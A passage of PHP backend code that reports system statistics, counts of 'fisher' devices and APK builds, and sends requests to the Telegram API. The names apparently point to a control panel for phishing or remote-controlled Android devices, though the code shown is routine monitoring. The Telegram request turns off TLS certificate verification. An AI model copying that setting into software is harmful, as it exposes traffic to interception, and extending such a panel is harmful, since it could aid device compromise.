            CURLOPT_TIMEOUT => 15,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_NOSIGNAL => true,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        if (!empty($telegram['api_proxy'])) {
            curl_setopt($ch, CURLOPT_PROXY, trim($telegram['api_proxy']));
        }
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($error) return [false, $error];
        $result = json_decode((string)$response, true);
        if ($status !== 200 || empty($result['ok'])) return [false, (string)($result['description'] ?? 'Telegram API 请求失败')];
        return [true, ''];
    }

    /**
     * GET /api/system/info
     * 系统信息
     */
    public function systemInfo()
    {
        $totalDevices = Db::table('fisher_devices')->count();

        // 从 Node.js 获取真实在线设备数和 uptime
        $onlineDevices = 0;
        $uptime = 0;
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $health = @file_get_contents(self::wsBaseUrl() . '/health', false, $ctx);
            if ($health) {
                $hData = json_decode($health, true);
                $onlineDevices = $hData['onlineDevices'] ?? 0;
                $uptime = $hData['uptime'] ?? 0;
            }
        } catch (\Throwable $e) {}
        if ($onlineDevices === 0) {
            $onlineDevices = Db::table('fisher_devices')->where('is_connected', 1)->count();
        }

        // 系统资源信息
        $cpuCores = (int)($_SERVER['NUMBER_OF_PROCESSORS'] ?? 1);
        $cpuUsage = 0;
        $cpuModel = 'Intel/AMD';
        $memTotal = 0;
        $memUsed = 0;
        $memUsage = 0;
        $diskTotal = 0;
        $diskUsed = 0;
        $diskUsage = 0;

        try {
            // 磁盘
            $diskPath = PHP_OS_FAMILY === 'Windows' ? 'C:\\' : '/';
            $diskTotal = @disk_total_space($diskPath) ?: 0;
            $diskFree = @disk_free_space($diskPath) ?: 0;
            $diskUsed = $diskTotal - $diskFree;
            $diskUsage = $diskTotal > 0 ? (int)(($diskUsed / $diskTotal) * 100) : 0;

            // 内存 + CPU（通过 shell）
            if (PHP_OS_FAMILY === 'Windows') {
                $memInfo = @shell_exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /value 2>nul');
                if ($memInfo && preg_match('/TotalVisibleMemorySize=(\d+)/', $memInfo, $m)) {
                    $memTotal = (int)$m[1] * 1024;
                }
                if ($memInfo && preg_match('/FreePhysicalMemory=(\d+)/', $memInfo, $m2)) {
                    $memUsed = $memTotal - ((int)$m2[1] * 1024);
                }
                $memUsage = $memTotal > 0 ? (int)(($memUsed / $memTotal) * 100) : 0;

                $cpuLine = @shell_exec('wmic cpu get loadpercentage /value 2>nul');
                if ($cpuLine && preg_match('/LoadPercentage=(\d+)/', $cpuLine, $m3)) {
                    $cpuUsage = (int)$m3[1];
                }

                // CPU核心数
                if (isset($_SERVER['NUMBER_OF_PROCESSORS'])) {
                    $cpuCores = (int)$_SERVER['NUMBER_OF_PROCESSORS'];
                }
                $cpuModelLine = @shell_exec('wmic cpu get name /value 2>nul');
                if ($cpuModelLine && preg_match('/Name=(.+)/', $cpuModelLine, $m4)) {
                    $cpuModel = trim($m4[1]);
                }
            } else {
                // Linux 系统信息获取
                // 内存信息
                if (is_readable('/proc/meminfo')) {
                    $memInfoRaw = @file_get_contents('/proc/meminfo');
                    if ($memInfoRaw) {
                        if (preg_match('/MemTotal:\s+(\d+)/', $memInfoRaw, $mTotal)) {
                            $memTotal = (int)$mTotal[1] * 1024;
                        }
                        if (preg_match('/MemAvailable:\s+(\d+)/', $memInfoRaw, $mAvail)) {
                            $memUsed = $memTotal - ((int)$mAvail[1] * 1024);
                        } elseif (preg_match('/MemFree:\s+(\d+)/', $memInfoRaw, $mFree)) {
                            $memUsed = $memTotal - ((int)$mFree[1] * 1024);
                        }
                        $memUsage = $memTotal > 0 ? (int)(($memUsed / $memTotal) * 100) : 0;
                    }
                } else {
                    $memFreeCmd = @shell_exec("free -b 2>/dev/null");
                    if ($memFreeCmd && preg_match('/Mem:\s+(\d+)\s+(\d+)/', $memFreeCmd, $mFree)) {
                        $memTotal = (int)$mFree[1];
                        $memUsed = (int)$mFree[2];
                        $memUsage = $memTotal > 0 ? (int)(($memUsed / $memTotal) * 100) : 0;
                    }
                }

                // CPU核心数
                if (is_readable('/proc/cpuinfo')) {
                    $cpuCores = substr_count(@file_get_contents('/proc/cpuinfo'), "\nprocessor") + 1;
                } else {
                    $nproc = @shell_exec('nproc 2>/dev/null');
                    if ($nproc) $cpuCores = (int)trim($nproc);
                }

                // CPU型号
                if (is_readable('/proc/cpuinfo')) {
                    $cpuinfo = @file_get_contents('/proc/cpuinfo');
                    if ($cpuinfo && preg_match('/model name\s*:\s*(.+)/i', $cpuinfo, $mModel)) {
                        $cpuModel = trim($mModel[1]);
                    }
                }

                // CPU使用率
                $stat1 = @file_get_contents('/proc/stat');
                if ($stat1) {
                    preg_match('/cpu\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/', $stat1, $s1);
                    if (count($s1) >= 8) {
                        usleep(200000); // 200ms
                        $stat2 = @file_get_contents('/proc/stat');
                        if ($stat2 && preg_match('/cpu\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/', $stat2, $s2)) {
                            $total1 = $s1[1] + $s1[2] + $s1[3] + $s1[4] + $s1[5] + $s1[6] + $s1[7];
                            $idle1 = $s1[4];
                            $total2 = $s2[1] + $s2[2] + $s2[3] + $s2[4] + $s2[5] + $s2[6] + $s2[7];
                            $idle2 = $s2[4];
                            $deltaTotal = $total2 - $total1;
                            $deltaIdle = $idle2 - $idle1;
                            if ($deltaTotal > 0) {
                                $cpuUsage = (int)((($deltaTotal - $deltaIdle) / $deltaTotal) * 100);
                            }
                        }
                    }
                }
                if ($cpuUsage === 0) {
                    $topCmd = @shell_exec("top -bn1 2>/dev/null | grep 'Cpu(s)'");
                    if ($topCmd && preg_match('/(\d+[\.\d]?)\s*us/', $topCmd, $mTop)) {
                        $cpuUsage = (int)$mTop[1];
                    }
                }
            }
        } catch (\Throwable $e) {
            // 获取系统信息失败不影响响应
        }

        // APK 数量
        $totalApks = Db::table('fisher_apk_builds')->count();

        return json([
            'success' => true,
            'data' => [
                'version'       => '1.0.0',
                'uptime'        => $uptime,
                'totalDevices'  => $totalDevices,
                'onlineDevices' => $onlineDevices,
                'totalApks'     => $totalApks,
                'totalAbPacks'  => 0,
                'cpuUsage'      => $cpuUsage,
                'cpuCores'      => $cpuCores,
                'cpuModel'      => $cpuModel,
                'memUsage'      => $memUsage,
                'memTotal'      => $memTotal,
                'memUsed'       => $memUsed,
                'diskUsage'     => $diskUsage,
                'diskTotal'     => $diskTotal,
                'diskUsed'      => $diskUsed,
            ],
            'message' => 'success',
        ]);
    }
}
